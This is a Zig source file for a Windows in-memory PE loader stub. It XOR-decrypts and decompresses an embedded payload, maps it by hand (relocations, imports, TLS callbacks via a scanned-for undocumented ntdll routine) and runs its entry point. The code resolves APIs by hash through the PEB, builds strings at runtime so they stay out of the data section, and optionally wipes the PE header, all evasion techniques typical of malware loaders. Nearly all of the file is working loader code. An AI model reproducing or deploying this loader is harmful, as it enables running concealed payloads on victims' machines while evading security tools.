const std = @import("std");
const builtin = @import("builtin");
const windows = std.os.windows;
const win32 = @import("struct.zig");
const depack = @import("depack.zig");
const string = []const u8;
pub const std_options = struct {
    pub const log_level = if (builtin.output_mode == .Exe) .info else .err;
};
pub fn main() !void {
    var allocator = std.heap.page_allocator;
    var data = try @import("generator.zig").readFile(
        "instance" ++ if (@sizeOf(usize) == 4) "32" else "64",
        allocator,
    );
    defer allocator.free(data);
    // data skip asm call $+instlen
    go(@ptrCast(data[5..]));
}

pub export fn go(data: [*c]u8) void {
    var apis = apiAddr{};
    std.log.info("[+]getApi", .{});
    if (!getApi(&apis)) {
        std.log.info("[x]apis not found", .{});
        return;
    }

    // 4 for rlen,4 for packlen,128 for keyBytes,1 for wipe header,
    const infolen = 4 + 4 + 128 + 1;
    var ptr: [*c]align(1) u32 = @ptrCast(data);
    var rlen = ptr[0];
    var packlen = ptr[1];
    if (rlen <= packlen) {
        apis.ExitProcess.?(-1);
    }
    var keyBytes = @as([*c]u8, @ptrCast(&data[8]))[0..128];
    var wipeHeader = data[infolen - 1];
    std.log.info("[+]parse info", .{});
    std.log.info("[+] keyBytes: {s}", .{std.fmt.fmtSliceHexLower(keyBytes)});
    std.log.info("[+] reallen:{} packlen:{} wipeheader:{}", .{ rlen, packlen, wipeHeader });
    var newdata = apis.VirtualAlloc.?(
        0,
        packlen,
        windows.MEM_COMMIT | windows.MEM_RESERVE,
        windows.PAGE_READWRITE,
    );
    var inst = newdata[0..packlen];
    std.mem.copyForwards(u8, inst, data[infolen .. infolen + packlen]);
    // decrypt
    for (0..inst.len) |i| {
        inst[i] ^= keyBytes[i % keyBytes.len];
    }
    // uncompress
    var unpck = apis.VirtualAlloc.?(
        0,
        rlen,
        windows.MEM_COMMIT | windows.MEM_RESERVE,
        windows.PAGE_READWRITE,
    );
    std.log.info("[+]decompress src:0x{X} dst:0x{X}", .{
        @intFromPtr(inst.ptr),
        @intFromPtr(unpck),
    });
    _ = depack.aP_depack(inst.ptr, unpck);
    _ = apis.VirtualFree.?(newdata, 0, windows.MEM_RELEASE);
    inst = unpck[0..rlen];
    apis.ExitProcess.?(runPE(&apis, inst, wipeHeader != 0));
}

pub export fn goEnd() void {}
inline fn x(comptime str: string) []u8 {
    // 通过分块@memcpy，强制生成运行时的赋值指令(不需要rdata)
    var buf: [str.len]u8 = undefined;
    comptime var i = 0;
    const block = switch (builtin.cpu.arch) {
        .x86, .x86_64 => @sizeOf(usize) - 1,
        .arm, .aarch64 => @sizeOf(usize) - 1,
        .riscv64 => 4,
        else => @compileError("untested arch"),
    };
    inline while (i + block < str.len) : (i += block) {
        @memcpy(buf[i .. i + block], str[i .. i + block]);
    }
    @memcpy(buf[i..], str[i..]);
    return &buf;
}
inline fn runPE(apis: *apiAddr, inst: []u8, wipeHeader: bool) i32 {
    std.log.info("[+]runPE", .{});
    var dos: *win32.IMAGE_DOS_HEADER = @ptrCast(@alignCast(inst.ptr));
    var nt: *win32.IMAGE_NT_HEADERS = rva2va(*win32.IMAGE_NT_HEADERS, @ptrCast(inst.ptr), @as(u32, @bitCast(dos.e_lfanew)));
    var hasreloc = (nt.FileHeader.Characteristics & win32.IMAGE_FILE_RELOCS_STRIPPED) == 0;
    var isdll = (nt.FileHeader.Characteristics & win32.IMAGE_FILE_DLL) != 0;
    var tmp = apis.VirtualAlloc.?(
        if (hasreloc) 0 else nt.OptionalHeader.ImageBase,
        nt.OptionalHeader.SizeOfImage + 4096,
        windows.MEM_COMMIT | windows.MEM_RESERVE,
        windows.PAGE_READWRITE,
    );
    if (tmp == null) {
        std.log.info("[x]alloc error", .{});
        return -2;
    }

    var cs: []u8 = tmp[0 .. nt.OptionalHeader.SizeOfImage + 4096];
    std.log.info("[+]alloc at 0x{X}", .{@intFromPtr(cs.ptr)});
    var tlsldr = @as(*win32.LDR_DATA_TABLE_ENTRY, @alignCast(@ptrCast(&tmp[nt.OptionalHeader.SizeOfImage])));
    std.log.info("[+]copy header", .{});
    var headerLen = nt.OptionalHeader.SizeOfHeaders;
    std.mem.copyForwards(u8, cs[0..headerLen], inst[0..headerLen]);
    var sh: [*]win32.IMAGE_SECTION_HEADER = @ptrCast(
        @alignCast(
            inst.ptr + @as(u32, @bitCast(dos.e_lfanew)) + @offsetOf(
                win32.IMAGE_NT_HEADERS,
                "OptionalHeader",
            ) + @sizeOf(win32.IMAGE_OPTIONAL_HEADER),
        ),
    );
    std.log.info("[+]copy section", .{});
    for (0..nt.FileHeader.NumberOfSections) |i| {
        std.log.info("[+] {s}", .{sh[i].Name});
        var len = sh[i].SizeOfRawData;
        var p1 = sh[i].VirtualAddress;
        var p2 = sh[i].PointerToRawData;
        std.mem.copyForwards(u8, cs[p1 .. p1 + len], inst[p2 .. p2 + len]);
    }

    var rva = nt.OptionalHeader.DataDirectory[win32.IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    if (rva != 0) {
        std.log.info("[+]reloc", .{});
        var ibr: [*c]win32.IMAGE_BASE_RELOCATION = rva2va([*c]win32.IMAGE_BASE_RELOCATION, cs.ptr, rva);
        while (ibr.*.VirtualAddress != 0) {
            std.log.info("[+] ibr:0x{X} count:{}", .{ ibr.*.VirtualAddress, ibr.*.SizeOfBlock });
            var list: [*c]win32.IMAGE_RELOC = @ptrCast(ibr + 1);

            while (@intFromPtr(list) != @intFromPtr(ibr) + ibr.*.SizeOfBlock) {
                if (list.*.typ == win32.IMAGE_REL_TYPE) {
                    // *(ULONG_PTR*)((PBYTE)cs + ibr->VirtualAddress + list->offset) += (ULONG_PTR)ofs;
                    var ptr: *align(1) usize = @alignCast(@ptrCast(cs.ptr + ibr.*.VirtualAddress + list.*.offset));
                    var newptr = ptr.* + @as(usize, @intFromPtr(cs.ptr)) - nt.OptionalHeader.ImageBase;
                    ptr.* = newptr;
                }
                list += 1;
            }
            ibr = @ptrCast(@alignCast(list));
        }
    }

    rva = nt.OptionalHeader.DataDirectory[win32.IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (rva != 0) {
        std.log.info("[+]import", .{});
        var imp: [*c]win32.IMAGE_IMPORT_DESCRIPTOR = rva2va(
            [*c]win32.IMAGE_IMPORT_DESCRIPTOR,
            cs.ptr,
            rva,
        );
        while (imp.*.Name != 0) : ({
            imp += 1;
        }) {
            var name = rva2va([*c]u8, cs.ptr, imp.*.Name);
            std.log.info("[+] dll:{s}", .{name});

            var dll = apis.GetModuleHandleA.?(name) orelse apis.LoadLibraryA.?(name);
            zero(name);
            var oft = rva2va([*c]win32.IMAGE_THUNK_DATA, cs.ptr, imp.*.OriginalFirstThunk);
            var ft = rva2va([*c]win32.IMAGE_THUNK_DATA, cs.ptr, imp.*.FirstThunk);
            while (oft.*.AddressOfData != 0) : ({
                oft += 1;
                ft += 1;
            }) {
                if (oft.*.IMAGE_SNAP_BY_ORDINAL()) {
                    std.log.info("[+]  ordinal:0x{X}", .{oft.*.IMAGE_ORDINAL()});
                    ft.*.Function = apis.GetProcAddress.?(dll, @ptrFromInt(oft.*.IMAGE_ORDINAL()));
                } else {
                    var ibn = rva2va(*win32.IMAGE_IMPORT_BY_NAME, cs.ptr, oft.*.AddressOfData);
                    var apiname: [*c]u8 = @ptrCast(&ibn.Name[0]);
                    std.log.info("[+]  name:{s}", .{apiname});
                    ft.*.Function = apis.GetProcAddress.?(dll, apiname);
                    zero(apiname);
                }
            }
        }
    }

    // restore mem protect
    std.log.info("[+]restore mem protect", .{});
    for (0..nt.FileHeader.NumberOfSections) |i| {
        var len = sh[i].SizeOfRawData;
        var p1 = sh[i].VirtualAddress;
        var ncs = cs[p1 .. p1 + len];
        // if IMAGE_SCN_MEM_EXECUTE change Protect PAGE_EXECUTEXXXX
        var Characteristics = sh[i].Characteristics;
        if (Characteristics & win32.IMAGE_SCN_MEM_EXECUTE != 0) {
            var protect: windows.DWORD = windows.PAGE_EXECUTE_READ;
            if (Characteristics & win32.IMAGE_SCN_MEM_WRITE != 0) {
                protect = windows.PAGE_EXECUTE_READWRITE;
            }
            std.log.info("[+] restore {s} to 0x{X}", .{ sh[i].Name, protect });
            var oldprotect: windows.DWORD = undefined;
            _ = apis.VirtualProtect.?(
                ncs.ptr,
                ncs.len,
                protect,
                &oldprotect,
            );
        }
    }
    std.log.info("[+]tls", .{});
    if (findLdrpHandleTlsData(apis)) |LdrpHandleTlsData| {
        tlsldr.DllBase = cs.ptr;
        if (@sizeOf(usize) == 8) {
            std.log.info("[+] call LdrpHandleTlsData: 0x{X}", .{LdrpHandleTlsData});
            @as(win32.FnStdCallLdrpHandleTlsData, @ptrFromInt(LdrpHandleTlsData))(tlsldr);
        } else {
            var peb = std.os.windows.peb();
            var version = @as(u16, @truncate(peb.OSMajorVersion)) << 8 | @as(u16, @truncate(peb.OSMinorVersion));
            // version >= win8.1 callconv is thiscall
            // IsWindows8Point1OrGreater
            if (version >= win32.WIN32_WIN_NT_WINBLUE) {
                std.log.info("[+] version 0x{X},call LdrpHandleTlsData(thiscall): 0x{X}", .{ version, LdrpHandleTlsData });
                @as(win32.FnThisCallLdrpHandleTlsData, @ptrFromInt(LdrpHandleTlsData))(tlsldr);
            } else {
                std.log.info("[+] version 0x{X},call LdrpHandleTlsData(stdcall): 0x{X}", .{ version, LdrpHandleTlsData });
                @as(win32.FnStdCallLdrpHandleTlsData, @ptrFromInt(LdrpHandleTlsData))(tlsldr);
            }
        }
    } else {
        std.log.info("[!]findLdrpHandleTlsData fail", .{});
    }
    rva = nt.OptionalHeader.DataDirectory[win32.IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if (rva != 0) {
        var tls = rva2va(*win32.IMAGE_TLS_DIRECTORY, cs.ptr, rva);
        var callback: [*c]win32.PIMAGE_TLS_CALLBACK = tls.AddressOfCallBacks;
        while (callback.*) |cb| {
            std.log.info("[+] call tls callback: 0x{X}", .{@intFromPtr(cb)});
            cb(cs.ptr, win32.DLL_PROCESS_ATTACH, null);
            callback += 1;
        }
    }

    // magic PERE
    if (wipeHeader) {
        // wiping pe header
        std.log.info("[+]wiping pe header", .{});
        for (cs[0..headerLen]) |*item| {
            item.* = 0;
        }
    } else {
        std.log.info("[+]skip wiping pe header", .{});
    }
    var oep = rva2va(usize, cs.ptr, nt.OptionalHeader.AddressOfEntryPoint);
    _ = apis.VirtualFree.?(inst.ptr, 0, windows.MEM_RELEASE);
    std.log.info("[+]call entrypoint 0x{X},isdll:{}", .{ oep, isdll });
    if (isdll) {
        var dllmain_: *const fn (windows.PVOID, u32, u32) callconv(windows.WINAPI) windows.BOOL = @ptrFromInt(oep);
        _ = dllmain_(cs.ptr, 1, 0);
        return 0;
    } else {
        var main_: *const fn () i32 = @ptrFromInt(oep);
        return main_();
    }
}
inline fn eql(comptime T: type, a: []const T, b: []const T) bool {
    if (a.len != b.len) return false;
    if (a.ptr == b.ptr) return true;
    for (a, b) |a_elem, b_elem| {
        if (a_elem != b_elem) return false;
    }
    return true;
}
inline fn indexOfPosLinear(comptime T: type, haystack: []const T, start_index: usize, needle: []const T) ?usize {
    var i: usize = start_index;
    const end = haystack.len - needle.len;
    while (i <= end) : (i += 1) {
        if (eql(T, haystack[i .. i + needle.len], needle)) return i;
    }
    return null;
}

inline fn findLdrpHandleTlsData(apis: *apiAddr) ?usize {
    var dllname = "ntdll.dll".*;
    var ntdll = apis.GetModuleHandleA.?(&dllname);
    const dos: *win32.IMAGE_DOS_HEADER = @ptrCast(@alignCast(ntdll));
    const nt: *win32.IMAGE_NT_HEADERS = @ptrFromInt(@intFromPtr(ntdll) + @as(usize, @as(u32, @bitCast(dos.e_lfanew))));
    const memory = @as([*c]u8, @ptrCast(ntdll))[nt.OptionalHeader.BaseOfCode..nt.OptionalHeader.SizeOfImage];
    // 先找到LdrpHandleTlsData字符串
    var fnname = x("LdrpHandleTlsData");
    const strpos = indexOfPosLinear(u8, memory, 0, fnname) orelse return null;
    const strptr = @intFromPtr(memory.ptr) + strpos;
    std.log.info("[+] strptr: 0x{x}", .{strptr});

    if (@sizeOf(usize) == 4) {
        // 32位定位流程
        const strRefPos = indexOfPosLinear(u8, memory, 0, std.mem.asBytes(&strptr)) orelse return null;
        // 字符串被引用于异常处理函数中，定位其引用的指令
        // .text:7DEF201C                         loc_7DEF201C:                           ; DATA XREF: .text:stru_7DE9C120↑o
        // .text:7DEF201C                         ;   __except filter // owned by 7DEE2F75
        // .text:7DEF201C 8B 45 EC                mov     eax, [ebp+ms_exc.exc_ptr]
        // .text:7DEF201F 8B 08                   mov     ecx, [eax]
        // .text:7DEF2021 8B 09                   mov     ecx, [ecx]
        // .text:7DEF2023 89 4D BC                mov     [ebp+var_44], ecx
        // .text:7DEF2026 68 58 48 E9 7D          push    offset aLdrphandletlsd ; "LdrpHandleTlsData" <-------------
        // .text:7DEF202B 50                      push    eax
        // .text:7DEF202C E8 89 F8 01 00          call    _LdrpGenericExceptionFilter@8 ; LdrpGenericExceptionFilter(x,x)
        // .text:7DEF2031 C3                      retn

        // 在定位ms_exc.exc_ptr的偏移量0xEC,以及下一条mov指令0x8B
        const exceptfnkey = x("\xEC\x8B");
        const instPos = std.mem.lastIndexOfLinear(u8, memory[0..strRefPos], exceptfnkey) orelse return null;

        const exceptfnptr = @intFromPtr(memory.ptr) + instPos - 2;
        std.log.info("[+] exceptfnptr: 0x{x}", .{exceptfnptr});

        // 异常处理函数被引用在_EH4_SCOPETABLE结构的FilterFunc中
        // struct _EH4_SCOPETABLE {
        //         DWORD GSCookieOffset;
        //         DWORD GSCookieXOROffset;
        //         DWORD EHCookieOffset;
        //         DWORD EHCookieXOROffset;
        //         _EH4_SCOPETABLE_RECORD ScopeRecord[1];
        // };

        // struct _EH4_SCOPETABLE_RECORD {
        //         DWORD EnclosingLevel;
        //         long (*FilterFunc)();
        //             union {
        //             void (*HandlerAddress)();
        //             void (*FinallyFunc)();
        //     };
        // };
        // .text:7DE9C120 FE FF FF FF 00 00 00 00 88 FF FF FF 00 00 00 00 stru_7DE9C120   _EH4_SCOPETABLE <0FFFFFFFEh, 0, 0FFFFFF88h, 0, <0FFFFFFFEh, \
        // .text:7DE9C120 FE FF FF FF                                                                             ; DATA XREF: LdrpHandleTlsData(x)+2↓o
        // .text:7DE9C120 1C 20 EF 7D 32 20 EF 7D                                                          offset loc_7DEF201C, offset loc_7DEF2032>>
        const eh4key = struct {
            ehcookieOffset: u32 align(4),
            enclosingLevel: u32 align(4),
            filterFunc: usize align(4),
        }{
            .ehcookieOffset = 0,
            .enclosingLevel = 0xFFFFFFFE,
            .filterFunc = exceptfnptr,
        };

        var eh4pos = indexOfPosLinear(u8, memory, 0, std.mem.asBytes(&eh4key)) orelse return null;
        eh4pos -= 12;
        const eh4ptr = @intFromPtr(memory.ptr) + eh4pos;
        std.log.info("[+] eh4ptr: 0x{x}", .{eh4ptr});

        // EH4_SCOPETABLE结构被引用于LdrpHandleTlsData
        // .text:7DEAFFDE                         _LdrpHandleTlsData@4 proc near
        // .text:7DEAFFDE                         ; __unwind { // __SEH_prolog4
        // .text:7DEAFFDE 6A 58                                   push    58h
        // .text:7DEAFFE0 68 20 C1 E9 7D                          push    offset stru_7DE9C120 <-----------

        var fnpos = indexOfPosLinear(u8, memory, 0, std.mem.asBytes(&eh4ptr)) orelse return null;
        fnpos -= 3;

        return @intFromPtr(memory.ptr) + fnpos;
    } else {
        // 64位定位流程
        // .text:0000000180166680                         LdrpHandleTlsData$filt$0:               ; DATA XREF: .rdata:00000001801A1CA8↓o
        // .text:0000000180166680                                                                 ; .pdata:00000001801E2DBC↓o
        // .text:0000000180166680                         ;   __except filter // owned by 18000B787
        // .text:0000000180166680 40 55                                   push    rbp
        // .text:0000000180166682 48 83 EC 30                             sub     rsp, 30h
        // .text:0000000180166686 48 8B EA                                mov     rbp, rdx
        // .text:0000000180166689 48 8D 15 C8 3A 03 00                    lea     rdx, aLdrphandletlsd ; "LdrpHandleTlsData"
        // .text:0000000180166690 E8 43 5F FF FF                          call    LdrpGenericExceptionFilter
        // .text:0000000180166695 90                                      nop
        // .text:0000000180166696 48 83 C4 30                             add     rsp, 30h
        // .text:000000018016669A 5D                                      pop     rbp
        // .text:000000018016669B C3                                      retn

        // 先找到LdrpHandleTlsData的引用
        const exceptfnkey1 = x("\x48\x8D");
        var pos: usize = 0;
        var value: i32 = undefined;
        while (true) {
            pos = indexOfPosLinear(u8, memory, pos, exceptfnkey1) orelse return null;
            value = @truncate(@as(isize, @bitCast(strptr -% (@intFromPtr(memory.ptr) + pos + 7))));
            if (@as(*align(1) i32, @alignCast(@ptrCast(&memory[pos + 3]))).* == value) {
                std.log.info("[+] strRefaddr: 0x{x}", .{@intFromPtr(memory.ptr) + pos});
                break;
            }
            pos += 7;
        }
        // 再定位push rbp
        const exceptfnkey2 = x("\x40\x55");
        pos = std.mem.lastIndexOfLinear(u8, memory[0..pos], exceptfnkey2) orelse return null;
        const exceptfnRVA: u32 = @truncate(@intFromPtr(memory.ptr) + pos - nt.OptionalHeader.ImageBase);
        std.log.info("[+] exceptfnRVA: 0x{x}", .{exceptfnRVA});

        // 定位UNWIND_INFO_HDR
        // .rdata:00000001801A1C84 19 2D 0B 00             stru_1801A1C84  UNWIND_INFO_HDR <1, 3, 2Dh, 0Bh, 0, 0>
        // .rdata:00000001801A1C84                                                                 ; DATA XREF: .pdata:00000001801D3930↓o
        // .rdata:00000001801A1C88 1B 64                                   UNWIND_CODE <1Bh, 4, 6> ; UWOP_SAVE_NONVOL
        // .rdata:00000001801A1C8A 28 00                                   dw 28h
        // .rdata:00000001801A1C8C 1B 34                                   UNWIND_CODE <1Bh, 4, 3> ; UWOP_SAVE_NONVOL
        // .rdata:00000001801A1C8E 27 00                                   dw 27h
        // .rdata:00000001801A1C90 1B 01                                   UNWIND_CODE <1Bh, 1, 0> ; UWOP_ALLOC_LARGE
        // .rdata:00000001801A1C92 20 00                                   dw 20h
        // .rdata:00000001801A1C94 14 F0                                   UNWIND_CODE <14h, 0, 15> ; UWOP_PUSH_NONVOL
        // .rdata:00000001801A1C96 12 E0                                   UNWIND_CODE <12h, 0, 14> ; UWOP_PUSH_NONVOL
        // .rdata:00000001801A1C98 10 D0                                   UNWIND_CODE <10h, 0, 13> ; UWOP_PUSH_NONVOL
        // .rdata:00000001801A1C9A 0E C0                                   UNWIND_CODE <0Eh, 0, 12> ; UWOP_PUSH_NONVOL
        // .rdata:00000001801A1C9C 0C 70                                   UNWIND_CODE <0Ch, 0, 7> ; UWOP_PUSH_NONVOL
        // .rdata:00000001801A1C9E 00 00                                   align 4
        // .rdata:00000001801A1CA0 B4 F2 15 00                             dd rva __GSHandlerCheck_SEH
        // .rdata:00000001801A1CA4 01 00 00 00                             dd 1
        // .rdata:00000001801A1CA8 87 B7 00 00 A9 B7 00 00                 C_SCOPE_TABLE <rva loc_18000B787, rva loc_18000B7A9, \
        // .rdata:00000001801A1CA8 80 66 16 00 A9 B7 00 00                                rva LdrpHandleTlsData$filt$0, rva loc_18000B7A9>

        // 先定位C_SCOPE_TABLE
        var cScopeTablePtr: usize = undefined;
        pos = 0;
        while (true) {
            // 这里可能有多处引用exceptfnVA，要确认是C_SCOPE_TABLE结构
            pos = indexOfPosLinear(u8, memory, pos, std.mem.asBytes(&exceptfnRVA)) orelse return null;
            if (@as(*u32, @alignCast(@ptrCast(&memory[pos - 12]))).* == 1) {
                // -12的位置是C_SCOPE_TABLE结构的个数，目前观测到是1
                cScopeTablePtr = @intFromPtr(memory.ptr) + pos - 8;
                break;
            }
            pos += 4;
        }
        std.log.info("[+] cScopeTable: 0x{x}", .{cScopeTablePtr});

        // 再定位UNWIND_INFO_HDR
        // -16是假设至少有一个或两个UNWIND_INFO
        var maybeUnwindHdrPtr: [*c]u32 = @ptrFromInt(cScopeTablePtr - 16);
        var wantCount: u8 = 2;
        const lastUnwindInfoPtr: *u16 = @ptrFromInt(cScopeTablePtr - 10);
        if (lastUnwindInfoPtr.* == 0) {
            // UNWIND_CODE有对齐填充
            wantCount = 1;
        }
        const UNW_FLAG_EHANDLER = 1;
        while (true) {
            const hdr: win32.UNWIND_INFO_HDR = @bitCast(maybeUnwindHdrPtr.*);
            if (hdr.Version == 1 and (hdr.Flags & UNW_FLAG_EHANDLER == UNW_FLAG_EHANDLER) and hdr.CntUnwindCodes == wantCount) {
                break;
            }
            maybeUnwindHdrPtr -= 1;
            wantCount += 2;
        }
        const hdrRVA: u32 = @truncate(@intFromPtr(maybeUnwindHdrPtr) - nt.OptionalHeader.ImageBase);
        std.log.info("[+] unwindHdrRVA: 0x{x}", .{hdrRVA});
        // 通过UNWIND_INFO_HDR找到RUNTIME_FUNCTION
        // .pdata:00000001801D3930 70 B5 00 00 B5 BB 00 00                 RUNTIME_FUNCTION <rva LdrpHandleTlsData, rva algn_18000BBB5, \
        // .pdata:00000001801D3930 84 1C 1A 00                                               rva stru_1801A1C84>

        pos = indexOfPosLinear(u8, memory, 0, std.mem.asBytes(&hdrRVA)) orelse return null;
        const LdrpHandleTlsDataRVA = @as(*u32, @alignCast(@ptrCast(&memory[pos - 8]))).*;
        return LdrpHandleTlsDataRVA + nt.OptionalHeader.ImageBase;
    }
}
const apiAddr = struct {
    const Self = @This();
    GetProcAddress: ?*const fn (
        hModule: windows.PVOID,
        lpProcName: windows.LPCSTR,
    ) callconv(windows.WINAPI) usize = null,
    LoadLibraryA: ?*const fn (
        lpLibFileName: windows.LPCSTR,
    ) callconv(windows.WINAPI) windows.PVOID = null,
    GetModuleHandleA: ?*const fn (
        lpModuleName: ?windows.LPCSTR,
    ) callconv(windows.WINAPI) ?windows.PVOID = null,
    VirtualAlloc: ?*const fn (
        lpAddress: usize,
        dwSize: windows.SIZE_T,
        flAllocationType: windows.DWORD,
        flProtect: windows.DWORD,
    ) callconv(windows.WINAPI) [*c]u8 = null,

    VirtualFree: ?*const fn (
        lpAddress: [*c]u8,
        dwSize: windows.SIZE_T,
        dwFreeType: windows.DWORD,
    ) callconv(windows.WINAPI) windows.DWORD = null,
    VirtualProtect: ?*const fn (
        lpAddress: [*c]u8,
        dwSize: windows.SIZE_T,
        flProtect: windows.DWORD,
        lpflOldProtect: *windows.DWORD,
    ) callconv(windows.WINAPI) windows.DWORD = null,

    ExitProcess: ?*const fn (
        nExitCode: windows.LONG,
    ) callconv(windows.WINAPI) noreturn = null,
    fn ok(self: *Self) bool {
        inline for (@typeInfo(apiAddr).Struct.fields) |field| {
            if (@field(self, field.name) == null) {
                return false;
            }
        }
        return true;
    }
};

pub fn rva2va(comptime T: type, base: *const anyopaque, rva: usize) T {
    var ptr = @intFromPtr(base) + rva;
    return switch (@typeInfo(T)) {
        .Pointer => {
            return @as(T, @ptrFromInt(ptr));
        },
        .Int => {
            if (T != usize) {
                @compileError("expected usize, found '" ++ @typeName(T) ++ "'");
            }
            return @as(T, ptr);
        },
        else => {
            @compileError("expected pointer or int, found '" ++ @typeName(T) ++ "'");
        },
    };
}

inline fn hashApi(api: []const u8) u32 {
    var h: u32 = 0x6c6c6a62;
    for (api) |item| {
        // 0x20 for lowercase
        h = @addWithOverflow(@mulWithOverflow(31, h)[0], item | 0x20)[0];
    }
    return h;
}

inline fn sliceTo(buf: [*c]u8) []u8 {
    var len: usize = 0;
    while (buf[len] != 0) : ({
        len += 1;
    }) {}
    return buf[0..len];
}

inline fn zero(buf: [*c]u8) void {
    var p = buf;
    while (p.* != 0) {
        p.* = 0;
        p += 1;
    }
}

fn findApi(r: *apiAddr, inst: windows.PVOID) void {
    var dos: *win32.IMAGE_DOS_HEADER = @ptrCast(@alignCast(inst));
    var nt = rva2va(*win32.IMAGE_NT_HEADERS, inst, @as(u32, @bitCast(dos.e_lfanew)));
    var rva = nt.OptionalHeader.DataDirectory[win32.IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (rva == 0) {
        return;
    }
    var exp = rva2va(*win32.IMAGE_EXPORT_DIRECTORY, inst, rva);
    var cnt = exp.NumberOfNames;
    if (cnt == 0) {
        return;
    }
    var adr = rva2va([*c]u32, inst, exp.AddressOfFunctions);
    var sym = rva2va([*c]u32, inst, exp.AddressOfNames);
    var ord = rva2va([*c]u16, inst, exp.AddressOfNameOrdinals);
    var dll = sliceTo(rva2va([*c]u8, inst, exp.Name));
    std.log.info("[+]{s}", .{dll});
    for (0..cnt) |i| {
        var sym_ = rva2va([*c]u8, inst, sym[i]);
        var adr_ = rva2va(usize, inst, adr[ord[i]]);
        var hash = hashApi(sliceTo(sym_));
        inline for (@typeInfo(apiAddr).Struct.fields) |field| {
            if (hash == comptime hashApi(field.name)) {
                @field(r, field.name) = @ptrFromInt(adr_);
                std.log.info("[+]{s} at 0x{X}", .{ field.name, adr_ });
            }
        }
    }
}

fn getApi(apis: *apiAddr) bool {
    var peb = std.os.windows.peb();
    var ldr = peb.Ldr;
    var dte: *win32.LDR_DATA_TABLE_ENTRY = @ptrCast(ldr.InLoadOrderModuleList.Flink);
    while (dte.DllBase != null) : ({
        dte = @ptrCast(dte.InLoadOrderLinks.Flink);
    }) {
        findApi(apis, dte.DllBase.?);
        if (apis.ok()) {
            return true;
        }
    }
    return false;
}
